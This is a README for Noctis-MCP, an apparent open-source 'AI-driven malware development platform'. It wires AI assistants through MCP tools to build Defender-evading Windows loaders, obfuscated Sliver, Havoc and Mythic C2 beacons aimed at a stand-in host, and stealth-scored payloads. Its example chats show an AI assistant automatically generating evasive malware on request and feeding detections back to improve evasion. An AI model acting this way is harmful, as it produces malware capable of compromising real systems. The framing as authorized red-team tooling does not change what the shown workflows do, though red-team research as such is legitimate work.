<div align="center">

![Noctis-MCP Logo](NoctisAI.png)

**AI-Driven Malware Development Platform**

[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)](https://github.com/Yenn503/Noctis-MCP)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Version](https://img.shields.io/badge/version-2.0.0-orange)](https://github.com/Yenn503/Noctis-MCP)

</div>

**Legal Disclaimer**: This tool is designed exclusively for authorized security research, penetration testing, and red team operations. Unauthorized use of malware development tools is illegal. Users assume full responsibility for compliance with applicable laws.

---

## What's New in v2.0

### Simplified AI-Driven Workflow

**Noctis-MCP** features **8 intuitive tools** with **AI agents** doing the heavy lifting!

### Key Improvements

✅ **One-Stop Development**: `develop()` tool handles technique selection, code assembly, OPSEC optimization, and compilation
✅ **Agent-Based Architecture**: 4 specialized agents (TechniqueSelection, MalwareDevelopment, OpsecOptimization, Learning)
✅ **Cursor IDE Integration**: Native MCP support for seamless AI-powered development
✅ **Simplified C2**: Just 2 tools (`c2_generate`, `c2_list`) for all C2 frameworks
✅ **Better Documentation**: Complete MCP tools reference with examples

### Simple Usage Example

```python
# One command does everything!
develop(
    goal="Create syscall-based loader",
    target="Windows Defender",
    auto_compile=True
)
```

---

## Overview

Noctis-MCP v2.0 is an AI-assisted malware development framework that combines:

- **Agent-Based Architecture**: 4 specialized AI agents for intelligent malware creation
- **8 Simple MCP Tools**: Natural language interface for AI assistants (Cursor, Claude Desktop)
- **Technique Library**: 10 active techniques with MITRE ATT&CK mappings (12 unique TTPs)
- **Code Assembly**: Smart assembly of compatible techniques into working C code
- **OPSEC Optimization**: Automatic security posture scoring (0-10 scale)
- **Cross-Platform Compilation**: MSBuild (Windows) and MinGW (Linux)
- **C2 Integration**: Native support for Sliver, Havoc, and Mythic frameworks

### The 8 MCP Tools

| Tool | Purpose | When to Use |
|------|---------|-------------|
| `develop()` | One-stop malware creation | **Start here** - handles everything automatically |
| `browse()` | Explore techniques | Research available techniques, MITRE TTPs |
| `compile()` | Build executables | Manual compilation with specific options |
| `learn()` | Provide feedback | Report success/detection to improve AI |
| `files()` | Manage workspace | List, read, delete generated files |
| `help()` | Get guidance | New user? Get contextual help |
| `c2_generate()` | Generate C2 beacons | Create Sliver/Havoc/Mythic beacons |
| `c2_list()` | List C2 frameworks | Check C2 framework availability |

**Getting Started?** Just use `develop()` and let the AI agents handle the rest!

---

## Quick Start

### Prerequisites

- Python 3.11 or higher
- **Compiler** (for Windows malware compilation):
  - **Linux**: MinGW-w64 (auto-installed by setup.sh)
  - **macOS**: MinGW-w64 (install via Homebrew - see below)
  - **Windows**: Visual Studio Build Tools 2019+ (detected by setup.ps1)

### Installation

**Linux:**
```bash
git clone https://github.com/Yenn503/Noctis-MCP.git
cd Noctis-MCP

# Run automated setup (auto-installs MinGW)
chmod +x scripts/setup/setup.sh
./scripts/setup/setup.sh

# Verify installation
python scripts/verify_setup.py
```

**macOS:**
```bash
git clone https://github.com/Yenn503/Noctis-MCP.git
cd Noctis-MCP

# ⚠️ IMPORTANT: Install MinGW via Homebrew first
brew install mingw-w64

# Run automated setup
chmod +x scripts/setup/setup.sh
./scripts/setup/setup.sh

# Verify installation
python scripts/verify_setup.py
```

**Windows:**
```powershell
git clone https://github.com/Yenn503/Noctis-MCP.git
cd Noctis-MCP

# Run automated setup
.\scripts\setup\setup.bat

# Verify installation
python scripts\verify_setup.py
```

### Start Server

```bash
# Activate virtual environment
source venv/bin/activate  # Linux/macOS
# venv\Scripts\activate  # Windows

# Start API server
python server/noctis_server.py --port 8888

# Server runs on http://localhost:8888
```

---

## Cursor IDE Integration (Recommended)

### Setup MCP in Cursor

**1. Configure MCP:**

Create or edit `~/.cursor/mcp.json` (Windows: `%APPDATA%\Cursor\User\mcp.json`):

```json
{
  "mcpServers": {
    "noctis-mcp": {
      "command": "python",
      "args": [
        "C:/path/to/Noctis-MCP/noctis_mcp_client/noctis_mcp.py",
        "--server",
        "http://localhost:8888"
      ],
      "description": "Noctis-MCP v2.0 - AI Malware Development (8 tools: develop, browse, compile, learn, files, help, c2_generate, c2_list)",
      "timeout": 300,
      "env": {}
    }
  }
}
```

**2. Start Noctis Server:**
```bash
python server/noctis_server.py --port 8888
```

**3. Restart Cursor IDE**

**4. Use AI Chat:**
```
You: "Create a Windows 11 loader that evades Defender using indirect syscalls"

AI: [Automatically calls develop() tool and generates loader]

You: "The loader was detected by Defender"

AI: [Automatically calls learn() to improve future results]
```

The AI assistant will automatically use the right tools based on your natural language requests!

---

## Basic Usage

### Method 1: AI Chat (Easiest - Recommended)

In Cursor IDE or Claude Desktop:

```
You: "Create a shellcode loader for Windows 11"
AI: [calls develop() automatically]

You: "What syscall techniques are available?"
AI: [calls browse(category="syscalls")]

You: "Generate a Sliver HTTPS beacon with good OPSEC"
AI: [calls c2_generate() with appropriate parameters]
```

### Method 2: Python API

```python
# Import MCP client (simulates AI assistant)
from noctis_mcp_client.noctis_mcp import develop, browse, c2_generate

# Create malware
result = develop(
    goal="Create a process injection loader",
    target="Windows Defender",
    architecture="x64",
    auto_compile=True
)

print(f"Binary: {result['binary_path']}")
print(f"OPSEC Score: {result['opsec_score']}/10")

# Browse techniques
techniques = browse(category="syscalls")
print(f"Found {len(techniques['techniques'])} syscall techniques")

# Generate C2 beacon
beacon = c2_generate(
    framework="sliver",
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    obfuscate=True
)
```

### Method 3: REST API

```bash
# Create malware
curl -X POST http://localhost:8888/api/v2/agents/develop \
  -H "Content-Type: application/json" \
  -d '{
    "goal": "Create a syscall-based loader",
    "target": "Windows Defender",
    "auto_compile": true
  }'

# Browse techniques
curl http://localhost:8888/api/techniques?category=syscalls

# Generate C2 beacon
curl -X POST http://localhost:8888/api/c2/sliver/generate \
  -H "Content-Type: application/json" \
  -d '{
    "listener_host": "c2.example.com",
    "listener_port": 443,
    "protocol": "https",
    "obfuscate": true
  }'
```

---

## Architecture

### Agent-Based Architecture

```
                    +---------------------------+
                    |   AI Assistant (Cursor)   |
                    |  Natural Language Input   |
                    +-------------+-------------+
                                  |
                                  v
                    +---------------------------+
                    |      MCP Client Layer     |
                    |  8 Tools (develop, browse,|
                    |  compile, learn, etc.)    |
                    +-------------+-------------+
                                  |
                                  v HTTP/REST
                    +---------------------------+
                    |     Flask REST API        |
                    |    (noctis_server.py)     |
                    +-------------+-------------+
                                  |
                +----------------+------------------+
                |                |                  |
                v                v                  v
    +-----------+-----------+  +--------+  +--------------+
    |  Agent Registry       |  | Code   |  |  C2 Adapters |
    |  (Singleton Pattern)  |  | Assembl|  |              |
    +-----------+-----------+  | er     |  | - Sliver     |
                |              +--------+  | - Havoc      |
      +---------+----------+               | - Mythic     |
      |         |          |               +--------------+
      v         v          v
+-------+ +---------+ +----------+  +----------+
|Techniq| |Malware  | |  Opsec   |  | Learning |
|ueSel. | |  Dev.   | |  Optim.  |  |  Agent   |
|Agent  | |  Agent  | |  Agent   |  |          |
+-------+ +---------+ +----------+  +----------+
      |         |          |
      v         v          v
+-----------------------------------+
|      Technique Library            |
|   10 techniques, 12 MITRE TTPs    |
+-----------------------------------+
            |
            v
+-----------------------------------+
|       Compiler Engine             |
|   MSBuild (Windows) / MinGW       |
+-----------------------------------+
            |
            v
      Binary Output (.exe)
```

### The 4 AI Agents

1. **TechniqueSelectionAgent**: Analyzes your goal and selects the best compatible techniques
2. **MalwareDevelopmentAgent**: Assembles techniques into working C code with proper dependencies
3. **OpsecOptimizationAgent**: Scores and optimizes code for stealth (0-10 OPSEC score)
4. **LearningAgent**: Learns from feedback to improve future technique selection

**You don't interact with agents directly** - just use the `develop()` tool and they work automatically!

---

## Documentation

| Document | Purpose |
|----------|---------|
| [MCP_TOOLS_REFERENCE.md](docs/MCP_TOOLS_REFERENCE.md) | Complete guide to all 8 MCP tools |
| [USER_GUIDE.md](docs/USER_GUIDE.md) | Usage guide with workflows |
| [ARCHITECTURE.md](docs/ARCHITECTURE.md) | Agent architecture and design |
| [GETTING_STARTED.md](docs/GETTING_STARTED.md) | Installation and setup |
| [API_REFERENCE.md](docs/API_REFERENCE.md) | REST API documentation |
| [C2_INTEGRATION.md](docs/C2_INTEGRATION.md) | C2 framework setup |
| [CONTRIBUTING.md](docs/CONTRIBUTING.md) | Contributing guide |

---

## Features

### Malware Techniques

| Category | Techniques | Source |
|----------|------------|--------|
| API Obfuscation | DJB2 hashing, ROT13+XOR, CRC32 | MaldevAcademy |
| Syscalls | HellsHall, Trap flag, Indirect | MaldevAcademy |
| Injection | RunPE, APC, Thread pool | MaldevAcademy |
| Evasion | GPU hiding, Stack spoofing, VEH manipulation | MaldevAcademy |
| Encryption | CT-AES, AES-NI, XOR, RC4 | MaldevAcademy |
| Steganography | DWT PNG embedding | MaldevAcademy |
| Unhooking | DLL unhooking, ETW patching | MaldevAcademy |
| Persistence | Registry, Scheduled Tasks | MaldevAcademy |

### MITRE ATT&CK Coverage

**12 Unique TTPs Mapped**:
- **T1055** (Process Injection): 5 techniques
- **T1027** (Obfuscated Files): 4 techniques
- **T1106** (Native API): Syscalls, API hashing
- **T1562.001** (Impair Defenses): Unhooking
- **T1027.003** (Steganography): Payload hiding
- And more...

Query by MITRE TTP:
```python
browse(mitre_ttp="T1055")  # Get all T1055 techniques
```

### C2 Frameworks

**Sliver**
- Protocols: HTTPS, HTTP, DNS, TCP, mTLS
- Features: Beacon/Session modes, multiple formats
- Integration: Full API support

**Havoc**
- Sleep Obfuscation: Ekko, Foliage
- Features: Indirect syscalls, stack duplication
- Integration: Teamserver API

**Mythic**
- Agents: Apollo, Poseidon, Merlin, Apfell, Atlas
- Profiles: HTTP, HTTPS, WebSocket, DNS, SMB
- Integration: REST API, Docker

---

## OPSEC Analysis

Every output includes an **OPSEC score (0-10)**:

- **9-10**: Excellent - Hard to detect
- **7-8**: Good - Minor improvements possible
- **5-6**: Moderate - Several improvements needed
- **3-4**: Poor - Easily detected
- **0-2**: Critical - Immediate detection likely

**Analysis Factors**:
- String analysis (API names, debug strings)
- Import table (exposed APIs)
- Entropy (encrypted payloads)
- Known signatures
- Memory patterns

**Example**:
```python
result = develop(goal="Simple loader")
print(f"OPSEC: {result['opsec_score']}/10")

# If low, add more evasion techniques
result = develop(
    goal="Simple loader",
    techniques=["NOCTIS-T124", "NOCTIS-T118", "NOCTIS-T201"],
    complexity="high"
)
print(f"OPSEC: {result['opsec_score']}/10")  # Much better!
```

---

## Project Statistics

| Metric | Value |
|--------|-------|
| **Version** | 2.0.0 (Agent-Based) |
| **MCP Tools** | 8 (simplified from 21) |
| **AI Agents** | 4 (TechniqueSelection, MalwareDev, OpsecOptim, Learning) |
| **Active Techniques** | 10 (with full metadata) |
| **MITRE TTPs Mapped** | 12 unique |
| **C2 Frameworks** | 3 (Sliver, Havoc, Mythic) |
| **Total Code** | ~20,000 lines |
| **Source Files Indexed** | 126 |
| **Supported Platforms** | Windows, Linux, macOS |

---

## Common Workflows

### Workflow 1: Simple Loader (Beginner)

```python
# Just use develop()!
result = develop(
    goal="Create a shellcode loader",
    target="Windows Defender",
    auto_compile=True
)

print(f"Binary: {result['binary_path']}")
print(f"OPSEC: {result['opsec_score']}/10")
```

### Workflow 2: C2 Beacon (Intermediate)

```python
# Generate Sliver beacon
beacon = c2_generate(
    framework="sliver",
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    techniques=["NOCTIS-T124", "NOCTIS-T118"],
    obfuscate=True
)

print(f"Beacon: {beacon['beacon_path']}")
print(f"OPSEC: {beacon['opsec_score']}/10")
```

### Workflow 3: MITRE ATT&CK Testing (Advanced)

```python
# Find T1055 techniques
result = browse(mitre_ttp="T1055")

# Generate malware using T1055 techniques
malware = develop(
    goal="Test T1055 detection",
    techniques=[t['technique_id'] for t in result['techniques']],
    target="CrowdStrike",
    auto_compile=True
)

# Report results
print(f"MITRE TTP: T1055")
print(f"Binary: {malware['binary_path']}")
```

---

## Requirements

### System Requirements
- **OS**: Windows 10/11 or Linux (Ubuntu, Debian, Kali)
- **Python**: 3.11 or higher
- **Memory**: 4GB minimum, 8GB recommended
- **Disk**: 2GB free space

### Compiler Requirements

**Windows:**
```powershell
winget install Microsoft.VisualStudio.2022.BuildTools
```

**Linux:**
```bash
sudo apt update
sudo apt install mingw-w64
```

**macOS:**
```bash
brew install mingw-w64
```

### Python Dependencies
```bash
pip install -r requirements.txt
```

Core dependencies: Flask, FastMCP, requests, cryptography, pycryptodome, pytest

---

## Testing

```bash
# Test agents
python test_agents.py

# All tests should pass:
# ✓ TechniqueSelectionAgent
# ✓ MalwareDevelopmentAgent
# ✓ OpsecOptimizationAgent
# ✓ LearningAgent
# ✓ Agent Registry
```

---

## Security Considerations

### Best Practices

1. **Development Environment**: Use isolated VMs
2. **Testing**: Never test on production systems
3. **Authorization**: Obtain written permission
4. **Logging**: Maintain audit trail
5. **Storage**: Encrypt generated artifacts
6. **Feedback**: Report detections via `learn()` tool to improve AI

### Responsible Use

- Only for **authorized** security testing
- Obtain **written permission** before testing
- Use in **isolated environments** only
- Comply with all **applicable laws**
- **Report findings** responsibly

---

## License

MIT License - See [LICENSE](LICENSE) for details.

**Important**: While this framework is open source, generated malware is subject to legal restrictions. Users are solely responsible for compliance with all applicable laws.

---

## Contributing

Contributions welcome! See [CONTRIBUTING.md](docs/CONTRIBUTING.md) for:
- Code style guidelines
- Testing requirements
- Pull request process
- Adding new techniques

---

## Acknowledgments

- **MaldevAcademy**: Technique examples and training
- **HexStrike AI**: Inspiration for agent-based MCP architecture
- **Security Community**: Continuous innovation in evasion techniques
- **Anthropic**: FastMCP framework and Claude AI

---

## Contact

- **Repository**: https://github.com/Yenn503/Noctis-MCP
- **Issues**: https://github.com/Yenn503/Noctis-MCP/issues
- **Documentation**: See `docs/` directory

---

**Status**: Production Ready (v2.0 Agent-Based)
**Version**: 2.0.0
**Last Updated**: October 4, 2025
